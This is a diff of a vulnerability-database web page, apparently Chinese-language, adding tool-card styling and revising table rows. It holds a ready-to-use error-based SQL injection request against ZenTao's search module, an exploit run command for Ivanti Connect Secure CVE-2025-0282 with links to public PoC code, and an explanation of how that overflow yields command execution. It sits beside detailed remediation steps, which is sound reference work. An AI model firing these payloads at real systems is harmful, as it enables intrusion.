@@ -229,6 +229,35 @@ td .tag {
 .home-card .lbl { font-size: 13px; color: var(--text-muted); margin-top: 2px; }
 .home-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; }
 
+/* ── Tool Cards (Nuclei & AVE) ── */
+.home-tools {
+  display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;
+  margin: 24px auto 32px; max-width: 680px;
+}
+.tool-card {
+  display: flex; flex-direction: column; align-items: center; gap: 4px;
+  flex: 1; min-width: 200px; padding: 20px 16px;
+  background: var(--card-bg); border: 1px solid var(--card-border);
+  border-radius: 8px; cursor: pointer; text-decoration: none; color: var(--text);
+  transition: all .15s;
+}
+.tool-card:hover {
+  border-color: var(--primary); box-shadow: 0 2px 12px var(--shadow); text-decoration: none;
+  transform: translateY(-2px);
+}
+.tool-card .tool-icon { font-size: 32px; line-height: 1; margin-bottom: 6px; }
+.tool-card .tool-title { font-size: 16px; font-weight: 600; color: var(--text-strong); }
+.tool-card .tool-desc { font-size: 12px; color: var(--text-muted); text-align: center; }
+
+/* ── Star Banner ── */
+.star-banner {
+  margin: 0 auto 28px; max-width: 600px;
+  padding: 8px 16px; border-radius: 20px;
+  background: var(--primary-bg); color: var(--primary);
+  font-size: 14px; font-weight: 500;
+}
+.star-banner a { color: var(--primary); font-weight: 700; text-decoration: underline; }
+
 /* ── Footer ── */
 .doc-footer {
   text-align: center; padding: 16px; font-size: 12px; color: var(--text-muted);
@@ -1272,8 +1301,15 @@ https://github.com/imbas007/CVE-2025-24813-apache-tomcat
 4. 移除应用 classpath 中不必要的反序列化 gadget 库（如 commons-collections、commons-beanutils 等）
 5. 在 WAF 或反向代理层拦截包含 ../ 的 PUT 请求路径
 6. 限制 /sessions/ 目录的 PUT 访问权限
-修复版本：升级至 9.0.99+ / 10.1.35+ / 11.0.3+</td><td>20250310</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Ivanti</span></td><td class="cell-hover" onclick="copyCell(this)">Ivanti Connect Secure 栈溢出 RCE CVE-2025-0282</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">22.7R2.4（含）之前版本</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">ruby CVE-2025-0282.rb -t target -p 443
-https://github.com/sfewer-r7/CVE-2025-0282</td><td class="cell-hover" onclick="copyCell(this)">升级至 22.7R2.6+</td><td>20250108</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">禅道</span></td><td class="cell-hover" onclick="copyCell(this)">禅道项目管理软件 search 模块 words 参数前台 SQL 注入漏洞</td><td><span class="tag">SQL注入</span></td><td class="cell-hover" onclick="copyCell(this)">21.4</td><td class="cell-hover" onclick="copyCell(this)">/index.php?m=search&amp;f=index</td><td class="cell-hover" onclick="copyCell(this)">GET /index.php?m=search&amp;f=index&amp;words=123&#x27;) AND (SELECT 1474 FROM(SELECT COUNT(*),CONCAT(0x71716a7871,(SELECT (ELT(1474=1474,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ErSi&amp;type=all&amp;zin=1 HTTP/1.1 Host: target</td><td class="cell-hover" onclick="copyCell(this)">升级至禅道最新版本（CNVD-2022-42853 已修复）；对 search 模块 words 参数实施参数化查询或预编译处理；限制搜索接口的访问频率；WAF 拦截 SQL 注入特征。</td><td>20220801</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr></tbody>
+修复版本：升级至 9.0.99+ / 10.1.35+ / 11.0.3+</td><td>20250310</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Ivanti</span></td><td class="cell-hover" onclick="copyCell(this)">Ivanti Connect Secure 栈溢出 RCE漏洞 CVE-2025-0282</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)">Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, Ivanti Neurons for ZTA &lt; 22.7R2.3</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Ivanti Connect Secure / Policy Secure / ZTA Gateways 的 IF-T (IETF) TLS 协议处理函数 ift_handle_1 中存在栈缓冲区溢出漏洞。函数使用 strncpy 将 clientCapabilities 参数复制到 256 字节栈缓冲区 dest 时，错误地传递了源字符串长度 strlen(clientCapabilities) 而非目标缓冲区大小 sizeof(dest)，导致超过 256 字节的 payload 可覆盖栈上的返回地址和 this 指针，结合无栈金丝雀防护，攻击者可构造伪 vtable 实现 ROP 链调用 system() 执行任意命令。CVSS 9.0 (CRITICAL)。
+
+PoC:
+ruby CVE-2025-0282.rb -t target -p 443
+https://github.com/sfewer-r7/CVE-2025-0282
+https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/
+https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</td><td class="cell-hover" onclick="copyCell(this)">1. 立即使用 Ivanti 官方 Integrity Checker Tool (ICT) 进行入侵排查检测
+2. 如未发现入侵迹象：执行出厂重置（最高置信度），然后更新至 22.7R2.5+，最后审计认证/身份服务及权限访问账户
+3. 如已发现入侵：立即断开设备网络连接，使用已知干净的外部镜像执行出厂重置，隔离企业资源，吊销并重新颁发所有管理员密码、API密钥、本地用户密码以及认证服务器配置中的服务账户；对于受损域账户需重置密码两次（本地）、吊销 Kerberos 票据和云令牌</td><td>20250108</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">禅道</span></td><td class="cell-hover" onclick="copyCell(this)">禅道项目管理软件 search 模块 words 参数前台 SQL 注入漏洞</td><td><span class="tag">SQL注入</span></td><td class="cell-hover" onclick="copyCell(this)">21.4</td><td class="cell-hover" onclick="copyCell(this)">/index.php?m=search&amp;f=index</td><td class="cell-hover" onclick="copyCell(this)">GET /index.php?m=search&amp;f=index&amp;words=123&#x27;) AND (SELECT 1474 FROM(SELECT COUNT(*),CONCAT(0x71716a7871,(SELECT (ELT(1474=1474,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ErSi&amp;type=all&amp;zin=1 HTTP/1.1 Host: target</td><td class="cell-hover" onclick="copyCell(this)">升级至禅道最新版本（CNVD-2022-42853 已修复）；对 search 模块 words 参数实施参数化查询或预编译处理；限制搜索接口的访问频率；WAF 拦截 SQL 注入特征。</td><td>20220801</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr></tbody>
 </table>
 </div>
 <script>
